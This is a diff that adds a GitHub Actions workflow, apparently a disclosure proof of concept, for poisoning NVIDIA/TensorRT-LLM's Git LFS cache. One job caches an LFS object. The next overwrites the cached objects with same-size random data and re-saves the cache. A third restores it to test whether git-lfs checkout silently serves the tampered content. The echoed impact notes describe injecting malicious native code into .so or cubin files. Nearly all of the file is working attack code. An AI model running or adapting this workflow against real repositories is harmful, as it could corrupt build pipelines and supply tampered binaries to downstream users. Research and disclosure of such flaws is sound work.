@@ -1,0 +1,199 @@
+name: LFS Cache Poison PoC - NVIDIA/TensorRT-LLM
+on:
+  workflow_dispatch:
+
+permissions:
+  contents: read
+
+jobs:
+  baseline:
+    runs-on: ubuntu-latest
+    steps:
+    - uses: actions/checkout@v4
+      with:
+        lfs: false
+        fetch-depth: 1
+
+    - name: Fetch single LFS object to local store
+      env:
+        GIT_LFS_SKIP_SMUDGE: "1"
+      run: |
+        mkdir -p evidence
+        git lfs install --local
+        echo "=== Fetching only one small cubin LFS object ==="
+        git lfs fetch --include "docs/source/blogs/media/tech_blog3_mla_absorb.png" origin 2>&1 | tee evidence/baseline-lfs-fetch.txt
+        echo ""
+        echo "=== LFS objects in .git/lfs/objects ==="
+        find .git/lfs/objects -type f 2>/dev/null | sort | tee evidence/lfs-cache-baseline.txt
+        echo "Count: $(find .git/lfs/objects -type f 2>/dev/null | wc -l)"
+        echo ""
+        echo "=== LFS tracked files ==="
+        git lfs ls-files 2>/dev/null | head -20 | tee evidence/lfs-ls-files.txt
+        echo ""
+        echo "=== Total LFS objects in repo ==="
+        git lfs ls-files 2>/dev/null | wc -l | tee evidence/lfs-total-count.txt
+
+    - name: Record baseline hash
+      run: |
+        mkdir -p evidence
+        git lfs checkout --include "docs/source/blogs/media/tech_blog3_mla_absorb.png" 2>/dev/null || true
+        SHA=$(sha256sum docs/source/blogs/media/tech_blog3_mla_absorb.png 2>/dev/null | awk '{print $1}')
+        echo "baseline_sha256=$SHA" | tee evidence/baseline-hash.txt
+        echo ""
+        echo "=== Impact: This image is used in TensorRT-LLM documentation ==="
+        echo "A poisoned image could deliver phishing content in NVIDIA docs"
+
+    - name: Save LFS cache
+      uses: actions/cache/save@v4
+      with:
+        path: .git/lfs
+        key: trtllm-lfs-poison-${{ github.run_id }}-baseline
+
+    - name: Upload baseline evidence
+      uses: actions/upload-artifact@v4
+      with:
+        name: baseline-${{ github.run_id }}
+        path: evidence/
+        retention-days: 90
+
+  poison:
+    needs: baseline
+    runs-on: ubuntu-latest
+    steps:
+    - uses: actions/checkout@v4
+      with:
+        lfs: false
+        fetch-depth: 1
+
+    - name: Restore LFS cache from baseline
+      uses: actions/cache/restore@v4
+      with:
+        path: .git/lfs
+        key: trtllm-lfs-poison-${{ github.run_id }}-baseline
+
+    - name: Poison LFS cache objects
+      run: |
+        mkdir -p evidence
+        echo "=== POISONING LFS CACHE ==="
+        echo "TensorRT-LLM tracks 5883+ files via LFS including:"
+        echo "  - *.so, *.dll, *.a, *.lib (native libraries)"
+        echo "  - *cubin.cpp (CUDA kernel binaries embedded in C++ source)"
+        echo "  - *.txz, *.xz (compressed archives)"
+        echo "  - *.png, *.jpg (documentation images)"
+        echo ""
+        echo "Poisoning a .a static lib or cubin kernel would compromise"
+        echo "the build pipeline of every downstream NVIDIA TensorRT-LLM user."
+        echo ""
+        find .git/lfs/objects -type f 2>/dev/null | sort | while read obj; do
+          ORIGINAL_SIZE=$(stat -c%s "$obj")
+          ORIGINAL_SHA=$(sha256sum "$obj" | awk '{print $1}')
+          dd if=/dev/urandom of="$obj" bs=1 count="$ORIGINAL_SIZE" 2>/dev/null
+          POISON_SHA=$(sha256sum "$obj" | awk '{print $1}')
+          echo "$obj original=$ORIGINAL_SHA poison=$POISON_SHA size=$ORIGINAL_SIZE" >> evidence/poison-manifest.txt
+        done
+        echo "poison_timestamp=$(date -u +%Y-%m-%dT%H:%M:%SZ)" >> evidence/poison-manifest.txt
+        echo "poisoned_count=$(wc -l < evidence/poison-manifest.txt 2>/dev/null || echo 0)" >> evidence/poison-manifest.txt
+
+    - name: Save poisoned LFS cache
+      uses: actions/cache/save@v4
+      with:
+        path: .git/lfs
+        key: trtllm-lfs-poison-${{ github.run_id }}-poison
+
+    - name: Upload poison evidence
+      uses: actions/upload-artifact@v4
+      with:
+        name: poison-${{ github.run_id }}
+        path: evidence/
+        retention-days: 90
+
+  attack:
+    needs: poison
+    runs-on: ubuntu-latest
+    steps:
+    - uses: actions/checkout@v4
+      with:
+        lfs: false
+        fetch-depth: 1
+
+    - name: Restore poisoned LFS cache
+      uses: actions/cache/restore@v4
+      with:
+        path: .git/lfs
+        key: trtllm-lfs-poison-${{ github.run_id }}-poison
+
+    - name: Verify poisoned cache + fetch + checkout
+      continue-on-error: true
+      run: |
+        mkdir -p evidence
+        git lfs install --local 2>&1 | tee evidence/lfs-install.txt
+        echo ""
+        echo "=== .git/lfs/objects BEFORE fetch (from poisoned cache) ==="
+        find .git/lfs/objects -type f 2>/dev/null | head -10 | tee evidence/lfs-objects-before.txt
+        echo "Count: $(find .git/lfs/objects -type f 2>/dev/null | wc -l)"
+        echo ""
+        echo "=== git lfs fetch (key attack: skips existing objects via size-only match) ==="
+        git lfs fetch --include "docs/source/blogs/media/tech_blog3_mla_absorb.png" origin 2>&1 | tee evidence/lfs-fetch.txt || true
+        echo "lfs_fetch_rc=$?" >> evidence/lfs-fetch-rc.txt
+        echo ""
+        echo "=== git lfs checkout ==="
+        git lfs checkout --include "docs/source/blogs/media/tech_blog3_mla_absorb.png" 2>&1 | tee evidence/lfs-checkout.txt || true
+        echo "lfs_checkout_rc=$?" >> evidence/lfs-checkout-rc.txt
+
+    - name: V2 - Integrity guarantee check
+      run: |
+        mkdir -p evidence
+        echo "=== V2: Integrity Guarantee Test ==="
+        LFS_RC=$(cat evidence/lfs-checkout-rc.txt 2>/dev/null | tr -dc '0-9' | tail -c1)
+        echo "git lfs checkout exit code: $LFS_RC"
+        IMG="docs/source/blogs/media/tech_blog3_mla_absorb.png"
+        POINTER_OID=$(git cat-file -p "HEAD:$IMG" 2>/dev/null | grep 'oid sha256:' | sed 's/oid sha256://' | tr -d '[:space:]')
+        ACTUAL_SHA=$(sha256sum "$IMG" 2>/dev/null | awk '{print $1}')
+        echo "Pointer OID: $POINTER_OID"
+        echo "Actual SHA256: $ACTUAL_SHA"
+        echo "pointer_oid=$POINTER_OID" >> evidence/v2-integrity.json
+        echo "worktree_sha256=$ACTUAL_SHA" >> evidence/v2-integrity.json
+        if [ -n "$POINTER_OID" ] && [ "$ACTUAL_SHA" != "$POINTER_OID" ]; then
+          echo "VERDICT: git-lfs returned exit 0 with content that does NOT match the pointer OID" >> evidence/v2-integrity.json
+          echo "MISMATCH: expected_oid=$POINTER_OID actual_sha256=$ACTUAL_SHA" >> evidence/v2-integrity.json
+          echo "mismatches=1" >> evidence/v2-integrity.json
+        elif [ -n "$POINTER_OID" ] && [ "$ACTUAL_SHA" = "$POINTER_OID" ]; then
+          echo "OK: oid=$POINTER_OID" >> evidence/v2-integrity.json
+          echo "mismatches=0" >> evidence/v2-integrity.json
+        else
+          echo "SKIP: could not extract pointer OID" >> evidence/v2-integrity.json
+          echo "mismatches=0" >> evidence/v2-integrity.json
+        fi
+        echo "lfs_checkout_rc=$LFS_RC" >> evidence/v2-integrity.json
+        echo ""
+        echo "=== IMPACT ANALYSIS ==="
+        echo "NVIDIA/TensorRT-LLM tracks 5883+ files via LFS including:"
+        echo "  - Native shared libraries (*.so, *.dll)"
+        echo "  - Static libraries (*.a, *.lib)"
+        echo "  - CUDA kernel binaries (*cubin.cpp)"
+        echo "  - Compressed archives (*.txz, *.xz)"
+        echo "Poisoning a .so or cubin kernel would inject malicious"
+        echo "native code into every build that uses cached LFS objects."
+        echo "This affects NVIDIA's AI inference infrastructure downstream."
+
+    - name: Collect LFS cache state
+      run: |
+        mkdir -p evidence
+        find .git/lfs -type f -exec sha256sum {} \; 2>/dev/null > evidence/lfs-cache-attack-sha256.txt || true
+
+    - name: Upload attack evidence
+      uses: actions/upload-artifact@v4
+      with:
+        name: attack-${{ github.run_id }}
+        path: evidence/
+        retention-days: 90
+
+    - name: Print verdict
+      run: |
+        echo "## LFS Cache Poisoning Verdict - NVIDIA/TensorRT-LLM" >> $GITHUB_STEP_SUMMARY
+        V2=$(cat evidence/v2-integrity.json 2>/dev/null | head -10)
+        echo "V2 Integrity: $V2" >> $GITHUB_STEP_SUMMARY
+        echo "" >> $GITHUB_STEP_SUMMARY
+        echo "### Impact" >> $GITHUB_STEP_SUMMARY
+        echo "5883+ LFS-tracked files including native libraries (.so/.a/.dll)" >> $GITHUB_STEP_SUMMARY
+        echo "and CUDA kernel binaries (cubin.cpp)" >> $GITHUB_STEP_SUMMARY
